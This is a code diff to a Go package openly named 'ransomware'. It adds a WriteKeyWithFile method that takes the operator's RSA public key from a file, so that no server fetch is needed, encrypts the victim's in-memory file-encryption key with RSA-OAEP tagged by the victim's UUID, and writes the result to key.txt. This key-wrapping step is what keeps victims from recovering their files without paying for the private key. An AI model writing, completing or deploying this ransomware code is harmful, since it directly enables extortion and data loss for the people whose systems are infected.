@@ -2,6 +2,11 @@ package ransomware
 
 import (
 	"bytes"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
+	"encoding/pem"
 	"errors"
 	"fmt"
 	"io/ioutil"
@@ -147,6 +152,40 @@ func (rw *Ransomware) WriteMemSafeKey() error {
 	}
 
 	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// WriteKeyWithFile takes in a public key file so we don't need to fetch it from the server.
+func (rw *Ransomware) WriteKeyWithFile(publicKey []byte) error {
+	b, err := rw.MemguardKey.Open()
+	if err != nil {
+		memguard.SafePanic(err)
+	}
+	defer b.Destroy()
+
+	block, _ := pem.Decode(publicKey)
+	if block == nil {
+		return fmt.Errorf("value not pem-encoded")
+	}
+
+	if got, want := block.Type, "PUBLIC KEY"; got != want {
+		return fmt.Errorf("the public encryption key is of wrong type. got=%s, want=%s", got, want)
+	}
+
+	pubkey, err := x509.ParsePKCS1PublicKey(block.Bytes)
+	if err != nil {
+		return fmt.Errorf("bad public key: %s", err)
+	}
+
+	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, b.Bytes(), []byte("key-"+rw.Data.UUID))
+	if err != nil {
+		return err
+	}
+
+	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", out, 0600); err != nil {
 		return err
 	}
 
